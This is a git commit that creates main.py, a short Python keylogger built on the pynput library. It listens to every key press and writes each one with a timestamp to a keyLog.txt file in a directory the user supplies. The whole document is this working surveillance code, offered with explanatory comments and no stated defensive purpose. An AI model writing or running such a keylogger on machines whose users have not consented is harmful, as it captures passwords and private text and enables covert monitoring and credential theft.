34672200f51db44be2b1758887386a29cb98c783
Kshitij Sahdev <85095194+Pr1s0n3r627@users.noreply.github.com>
2023-09-28 21:32:16 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,22 @@
+# Import the necessary modules
+import pynput
+from pynput.keyboard import Key, Listener
+import logging
+
+# Define the directory where the log file will be saved
+log_dir = r"<path to the text file>"
+
+# Configure logging settings
+logging.basicConfig(
+    filename=(log_dir + r"/keyLog.txt"),  # Set the log file path
+    level=logging.DEBUG,                  # Set the logging level to DEBUG
+    format='%(asctime)s : %(message)s'    # Define the log message format
+)
+
+# This function is called when a key is pressed
+def on_press(key):
+    logging.info(str(key))  # Log the key that was pressed
+
+# Create a Listener object that will monitor key presses and call on_press() when a key is pressed
+with Listener(on_press=on_press) as listener:
+    listener.join()  # Start listening for key presses and keep the script running
